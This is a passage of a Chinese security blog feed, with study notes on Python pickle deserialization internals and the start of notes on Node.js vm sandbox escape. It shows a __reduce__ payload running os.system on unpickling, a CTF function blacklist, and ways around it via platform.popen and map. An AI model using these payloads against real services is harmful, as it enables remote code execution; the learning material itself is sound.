class="hljs-comment"># same as GLOBAL but using names on the stacks</span><br><span class="hljs-attr">MEMOIZE</span>          = b<span class="hljs-string">&#x27;\x94&#x27;</span>  <span class="hljs-comment"># store top of the stack in memo</span><br><span class="hljs-attr">FRAME</span>            = b<span class="hljs-string">&#x27;\x95&#x27;</span>  <span class="hljs-comment"># indicate the beginning of a new frame</span><br><br><span class="hljs-comment"># Protocol 5</span><br><br><span class="hljs-attr">BYTEARRAY8</span>       = b<span class="hljs-string">&#x27;\x96&#x27;</span>  <span class="hljs-comment"># push bytearray</span><br><span class="hljs-attr">NEXT_BUFFER</span>      = b<span class="hljs-string">&#x27;\x97&#x27;</span>  <span class="hljs-comment"># push next out-of-band buffer</span><br><span class="hljs-attr">READONLY_BUFFER</span>  = b<span class="hljs-string">&#x27;\x98&#x27;</span>  <span class="hljs-comment"># make top of stack readonly</span><br></code></pre></td></tr></table></figure><p>pickle.loads（或者pickle.load）是一个供我们调用的接口，其底层实现是基于<code>_Unpickler</code>类。都是把各自输入得到的东西作为文件流，喂给<code>_Unpickler</code>类；然后调用<code>_Unpickler.load()</code>实现反序列化。</p><p>在反序列化过程中，<code>_Unpickler</code>（以下称为机器，其实就是上面提到的pickle虚拟机）维护了两个东西：栈区和存储区。结构如下（本图片仅为示意图）：　</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132246662.jpg" alt="img"></p><p><strong>栈</strong>是unpickle机最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护<strong>最顶层的信息</strong>，而前序栈维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。</p><p><strong>存储区</strong>可以类比内存，用于存取变量。它是一个数组，以<strong>下标</strong>为索引。它的每一个单元可以用来存储任何东西，但是说句老实话，大多数情况下我们并不需要这个存储区。</p><p>您可以想象，一台机器读取我们输入的字符串，然后操作自己内部维护的各种结构，最后吐出来一个结果——这就是我们莫得感情的<code>_Unpickler</code>。为了研究它，也为了看懂那些乱七八糟的字符串，我们需要一个有力的调试器。这就是<code>pickletools</code>。</p><p>pickletools是python自带的pickle调试器，有三个功能：<strong>反汇编</strong>一个已经被打包的字符串、<strong>优化</strong>一个已经被打包的字符串、返回一个迭代器来供程序使用。</p><p>pickletools会将不可读二进制字节流转换成字符串，并进行解释。</p><p>以下代码为例</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Test</span>():</span><br><span class="hljs-class">    name = &#x27;&#x27;</span><br><span class="hljs-class">    def __init__(<span class="hljs-title">self</span>, <span class="hljs-title">name</span>=&#x27;<span class="hljs-title">matrix&#x27;</span>):</span><br><span class="hljs-class">        self.name = name</span><br><span class="hljs-class">        self.age = 20</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = <span class="hljs-type">Test</span>()</span><br><span class="hljs-class">b = pickle.dumps(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print(<span class="hljs-title">b</span>)</span><br><span class="hljs-class">print(&#x27;\<span class="hljs-title">n&#x27;</span>)</span><br><span class="hljs-class">pickletools.dis(<span class="hljs-title">b</span>)</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>80<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>955<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>08__main__<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>04Test<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>93<span class="hljs-char escape_">\x</span>94)<span class="hljs-char escape_">\x</span>81<span class="hljs-char escape_">\x</span>94&#125;<span class="hljs-char escape_">\x</span>94(<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>04name<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>06matrix<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>03age<span class="hljs-char escape_">\x</span>94K<span class="hljs-char escape_">\x</span>14ub.&#x27;</span><br><br><br>    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">4</span><br>    <span class="hljs-number">2</span>: \x95 FRAME      <span class="hljs-number">53</span><br>   <span class="hljs-number">11</span>: \x8c SHORT_BINUNICODE <span class="hljs-symbol">&#x27;__main_</span>_<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   21: <span class="hljs-char escape_">\x</span>94 MEMOIZE    (as 0)</span><br><span class="hljs-string">   22: <span class="hljs-char escape_">\x</span>8c SHORT_BINUNICODE &#x27;</span>Test<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   28: <span class="hljs-char escape_">\x</span>94 MEMOIZE    (as 1)</span><br><span class="hljs-string">   29: <span class="hljs-char escape_">\x</span>93 STACK_GLOBAL</span><br><span class="hljs-string">   30: <span class="hljs-char escape_">\x</span>94 MEMOIZE    (as 2)</span><br><span class="hljs-string">   31: )    EMPTY_TUPLE</span><br><span class="hljs-string">   32: <span class="hljs-char escape_">\x</span>81 NEWOBJ</span><br><span class="hljs-string">   33: <span class="hljs-char escape_">\x</span>94 MEMOIZE    (as 3)</span><br><span class="hljs-string">   34: &#125;    EMPTY_DICT</span><br><span class="hljs-string">   35: <span class="hljs-char escape_">\x</span>94 MEMOIZE    (as 4)</span><br><span class="hljs-string">   36: (    MARK</span><br><span class="hljs-string">   37: <span class="hljs-char escape_">\x</span>8c     SHORT_BINUNICODE &#x27;</span>name<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   43: <span class="hljs-char escape_">\x</span>94     MEMOIZE    (as 5)</span><br><span class="hljs-string">   44: <span class="hljs-char escape_">\x</span>8c     SHORT_BINUNICODE &#x27;</span>matrix<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   52: <span class="hljs-char escape_">\x</span>94     MEMOIZE    (as 6)</span><br><span class="hljs-string">   53: <span class="hljs-char escape_">\x</span>8c     SHORT_BINUNICODE &#x27;</span>age<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   58: <span class="hljs-char escape_">\x</span>94     MEMOIZE    (as 7)</span><br><span class="hljs-string">   59: K        BININT1    20</span><br><span class="hljs-string">   61: u        SETITEMS   (MARK at 36)</span><br><span class="hljs-string">   62: b    BUILD</span><br><span class="hljs-string">   63: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 4</span><br></code></pre></td></tr></table></figure><p>我们可以看到二进制字节流对应的操作码，这就是反汇编功能：解析那个字符串，然后告诉你这个字符串干了些什么。<strong>每一行都是一条指令。</strong></p><p><strong>整体流程总结</strong></p><ol><li>声明协议4，创建一个 frame。</li><li>写入模块和类名（<code>__main__.Test</code>），找到类对象。</li><li>用 NEWOBJ 创建新对象（调用 <code>Test.__new__()</code>）。</li><li>创建空 dict。</li><li>依次压入属性名和值（name, matrix, age, 20）。</li><li>SETITEMS 填充 dict。</li><li>BUILD 设置对象的属性。</li><li>STOP 结束。</li></ol><p>接下来试一试优化功能：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Test</span>():</span><br><span class="hljs-class">    name = &#x27;&#x27;</span><br><span class="hljs-class">    def __init__(<span class="hljs-title">self</span>, <span class="hljs-title">name</span>=&#x27;<span class="hljs-title">matrix&#x27;</span>):</span><br><span class="hljs-class">        self.name = name</span><br><span class="hljs-class">        self.age = 20</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = <span class="hljs-type">Test</span>()</span><br><span class="hljs-class">b = pickle.dumps(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">b = pickletools.optimize(<span class="hljs-title">b</span>)</span><br><span class="hljs-class">print(<span class="hljs-title">b</span>)</span><br><span class="hljs-class">print(&#x27;\<span class="hljs-title">n&#x27;</span>)</span><br><span class="hljs-class">pickletools.dis(<span class="hljs-title">b</span>)</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>80<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>95-<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>08__main__<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>04Test<span class="hljs-char escape_">\x</span>93)<span class="hljs-char escape_">\x</span>81&#125;(<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>04name<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>06matrix<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>03ageK<span class="hljs-char escape_">\x</span>14ub.&#x27;</span><br><br><br>    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">4</span><br>    <span class="hljs-number">2</span>: \x95 FRAME      <span class="hljs-number">45</span><br>   <span class="hljs-number">11</span>: \x8c SHORT_BINUNICODE <span class="hljs-symbol">&#x27;__main_</span>_<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   21: <span class="hljs-char escape_">\x</span>8c SHORT_BINUNICODE &#x27;</span>Test<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   27: <span class="hljs-char escape_">\x</span>93 STACK_GLOBAL</span><br><span class="hljs-string">   28: )    EMPTY_TUPLE</span><br><span class="hljs-string">   29: <span class="hljs-char escape_">\x</span>81 NEWOBJ</span><br><span class="hljs-string">   30: &#125;    EMPTY_DICT</span><br><span class="hljs-string">   31: (    MARK</span><br><span class="hljs-string">   32: <span class="hljs-char escape_">\x</span>8c     SHORT_BINUNICODE &#x27;</span>name<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   38: <span class="hljs-char escape_">\x</span>8c     SHORT_BINUNICODE &#x27;</span>matrix<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   46: <span class="hljs-char escape_">\x</span>8c     SHORT_BINUNICODE &#x27;</span>age<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   51: K        BININT1    20</span><br><span class="hljs-string">   53: u        SETITEMS   (MARK at 31)</span><br><span class="hljs-string">   54: b    BUILD</span><br><span class="hljs-string">   55: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 4</span><br></code></pre></td></tr></table></figure><p>利用pickletools，我们能很方便地看清楚每条语句的作用、检验我们手动构造出的字符串是否合法……总之，是我们调试的利器。现在手上有了工具，我们开始研究这个字符串是如何被pickle解读的吧。</p><p>想看操作码具体讲解的可以去看第三篇参考文章。</p><p>这里我们深入理解“漏洞成因”中<code>__reduce__</code>原理：</p><p>CTF竞赛对pickle的利用多数是在<code>__reduce__</code>方法上。它的指令码是<code>R</code>，干了这么一件事情：</p><ul><li>取当前栈的栈顶记为<code>args</code>，然后把它弹掉。</li><li>取当前栈的栈顶记为<code>f</code>，然后把它弹掉。</li><li>以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈。</li></ul><p>　　class的<code>__reduce__</code>方法，在pickle反序列化的时候会被执行。其底层的编码方法，就是利用了<code>R</code>指令码。 <code>f</code>要么返回字符串，要么返回一个tuple，后者对我们而言更有用。</p><p>　　一种很流行的攻击思路是：利用 <code>__reduce__</code> 构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。网上已经有海量的文章谈论这种方法，所以我们在这里不过多讨论。只给出一个例子：正常的字符串反序列化后，得到一个<code>Student</code>对象。我们想构造一个字符串，它在反序列化的时候，执行<code>ls /</code>指令。那么我们只需要这样得到payload</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span>(<span class="hljs-keyword">object</span>):<br>    name = <span class="hljs-string">&#x27;matrix&#x27;</span><br>    def __reduce__(self):<br>       <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&quot;ls /&quot;</span>,))<br>a = Rce()<br>print(pickle.dumps(a))<br></code></pre></td></tr></table></figure><p>那么，如何过滤掉reduce呢？由于<code>__reduce__</code>方法对应的操作码是<code>R</code>，只需要<strong>把操作码<code>R</code>过滤掉</strong>就行了。这个可以很方便地利用<code>pickletools.genops</code>来实现。</p><h1 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h1><h2 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h2><h2 id="绕过函数黑名单：奇技淫巧"><a href="#绕过函数黑名单：奇技淫巧" class="headerlink" title="绕过函数黑名单：奇技淫巧"></a>绕过函数黑名单：奇技淫巧</h2><p>有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]<br></code></pre></td></tr></table></figure><p>可惜<code>platform.popen()</code>不在名单里，它可以做到类似<code>system</code>的功能。这题死于黑名单有漏网之鱼。</p><p>另外，还有一个解（估计是出题人的预期解），那就是利用map来干这件事：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">class Exploit(object):<br>    def __reduce__(self):<br> return map,(os.system,[&quot;ls&quot;])<br></code></pre></td></tr></table></figure><p>总之，黑名单不可取。要禁止reduce这一套方法，最稳妥的方式是禁止掉<code>R</code>这个指令码。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.cnblogs.com/gcgc/p/10973418.html">python：序列化与反序列化（json、pickle、shelve） - 秋寻草 - 博客园</a></p><p><a href="https://zhuanlan.zhihu.com/p/148696337">python中的反序列化安全问题 - 知乎</a></p><p>[一篇文章带你理解漏洞之 Python 反序列化漏洞 - Hexo](<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python</a> 反序列化漏洞)</p><p><a href="https://xz.aliyun.com/news/10530">Python反序列化漏洞分析-先知社区</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎</a></p><p><a href="https://xz.aliyun.com/news/11253">最近碰到的 Python pickle 反序列化小总结-先知社区</a></p><p><a href="https://xz.aliyun.com/news/7032#toc-11">pickle反序列化初探-先知社区</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vm沙箱逃逸学习总结</title>
    <link href="/2025/07/13/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/07/13/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="沙箱与沙箱逃逸"><a href="#沙箱与沙箱逃逸" class="headerlink" title="沙箱与沙箱逃逸"></a>沙箱与沙箱逃逸</h2><p><strong>什么是沙箱（sandbox）？</strong></p><p>当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</p><p><strong>沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：</strong></p><p>sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。</p><p><strong>常见沙箱逃逸都有啥？</strong></p><p>浏览器沙箱逃逸：利用浏览器中的漏洞（如V8&#x2F;JSC内存漏洞、UAF、类型混淆等）获得沙箱进程权限，进一步利用提权漏洞逃逸到宿主系统。</p><p>虚拟机和容器沙箱逃逸：虚拟机逃逸，利用虚拟化软件（如VMware、VirtualBox、QEMU等）漏洞，从虚拟机突破到宿主机系统；容器逃逸，利用容器（如Docker、LXC等）漏洞突破容器边界，访问宿主机资源。</p><p>语言解释器沙箱逃逸：Node.js沙箱逃逸，利用<code>vm</code>模块、Function构造器等机制绕过沙箱，访问<code>process</code>、<code>require</code>等敏感对象，执行系统命令；Python沙箱逃逸，利用<code>exec</code>、<code>eval</code>、<code>__import__</code>等内置函数或对象反射实现突破，访问文件或系统命令。</p><p>移动端沙箱逃逸：iOS越狱&#x2F;Android提权，利用内核漏洞或安全机制缺陷突破应用沙箱，获得系统权限。</p><p>云环境沙箱逃逸：云函数&#x2F;FaaS沙箱隔离绕过，针对云平台多租户环境的隔离缺陷，实现跨租户攻击。</p><p>这里我们主要讲解语言解释器沙箱逃逸。</p><p><strong>语言解释器沙箱的作用：</strong></p><p>语言解释器沙箱的主要作用是安全隔离和受控执行，常用于在线编程平台、云函数、插件扩展、教育实验等需要运行不可信代码的场景。</p><h1 id="Node-js沙箱逃逸"><a href="#Node-js沙箱逃逸" class="headerlink" title="Node.js沙箱逃逸"></a>Node.js沙箱逃逸</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="vm模块"><a href="#vm模块" class="headerlink" title="vm模块"></a><strong>vm模块</strong></h3><p><strong>node.js是啥？</strong></p><p>JavaScript本来用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此JavaScript也可以作为一门后端语言。</p><p>所以Node.js是一个基于 Chrome V8 引擎的<strong>JavaScript 运行环境</strong>，允许开发者在服务器端运行 JavaScript 代码。</p><p><strong>什么是vm模块？</strong></p><p>vm模块是node.js内置的一个模块，理论上不能叫做沙箱，它只是Node.js提供给使用者的一个隔离环境</p><p>在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。</p><p><strong>vm模块的作用</strong></p><p>vm模块就是实现一个沙箱，然后我们往沙箱里传入代码，可以执行代码返回结果，同时不会对沙箱外面产生影响。</p><p>这里我们可以总结出vm实现的两个要点：</p><ol><li>传入字符串并将其作为代码执行，得到结果</li><li>不会对外面造成影响，如同函数一般，将其限制在作用域内，只要最后的运行结果</li></ol><p>我们这里用代码理解上面两点</p><p>我们现在当前目录创建age.txt，写入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>然后创建demo.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<br><span class="hljs-built_in">eval</span>(content)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br></code></pre></td></tr></table></figure><p>不难发现，成功将txt中的字符串作为代码执行并输出18。</p><p>这就是作用里的第一点</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248275.png" alt="image-20250705230950075"></p><p>但是如果当前作用域下有相同变量名，会发生什么</p><p>我们修改代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">let</span> age= <span class="hljs-number">20</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<br><span class="hljs-built_in">eval</span>(content)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br></code></pre></td></tr></table></figure><p>结果是出现报错</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248127.png" alt="image-20250705230923271"></p><p>在js中每一个模块都有自己独立的作用域，所以用eval执行字符串代码很容易出现上面的这个问题。</p><p>上述提到的方法由于不同模块作用域被限制了使用，那么我们是否可以自己创造作用域呢？</p><p>我们可以用new Function做到，new Function的第一个参数是形参名称，第二个参数是函数体。</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">let age= <span class="hljs-number">20</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">add</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Function</span><span class="hljs-params">(<span class="hljs-string">&#x27;age&#x27;</span>,<span class="hljs-string">&#x27;return age+1&#x27;</span>)</span><br><span class="hljs-title function_">console</span>.<span class="hljs-title function_">log</span><span class="hljs-params">(<span class="hljs-keyword">add</span>(age)</span>)<br><span class="hljs-title function_">console</span>.<span class="hljs-title function_">log</span><span class="hljs-params">(age)</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248143.png" alt="image-20250705230833913"></p><p>我们都知道函数内和函数外是两个作用域。</p><p>当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，然后返回结果，而这个过程并不会影响函数外的变量。</p><p>这就是作用里的第二点。</p><p>但是当参数过多时这种方法就变的麻烦起来了，并不实用。</p><p>从上面两个执行代码的例子可以看出来vm模块的实际作用：创建一个能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域。</p><h3 id="Nodejs作用域"><a href="#Nodejs作用域" class="headerlink" title="Nodejs作用域"></a><strong>Nodejs作用域</strong></h3><p>说到作用域，我们就要了解一下Node中的作用域是怎么分配的（在Node中一般把作用域叫上下文）</p><p>我们在写一个Node项目时往往要在一个文件里ruquire其他的js文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的上下文，包之间的作用域是互相隔离不互通的，也就是说就算我在1.js中require了2.js，那么我在1.js中也无法直接调用2.js中的变量和函数。</p><p>举个例子</p><p>在同一级目录下，有1.js和2.js两个文件</p><p>1.js</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>2.js</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">const <span class="hljs-keyword">a</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./1&quot;</span>)<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">a</span>.age)<br></code></pre></td></tr></table></figure><p>可以发现是undefined</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248147.png" alt="image-20250705230800331"></p><p>那么我们想2.js中引入并使用y1中的元素应该怎么办呢，Node给我们提供了一个将js文件中元素输出的接口<code>exports</code> ，把1.js修改成下面这样：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">20</span><br>exports.age <span class="hljs-operator">=</span> age<br></code></pre></td></tr></table></figure><p>我们再运行y2就可以拿到age的值了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248910.png" alt="image-20250705231543059"></p><p>我们用图来解释这两个包之间的关系就是</p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248734.png" alt="img" style="zoom:50%;" /><p>这个时候就有人会问左上角的global是什么？这里就要说到Node.js中的全局对象了。</p><p>刚才我们提到在JavaScript中<code>window</code>是全局对象，浏览器其他所有的属性都挂载在<code>window</code>下，</p><p>但是Node.js 没有 window 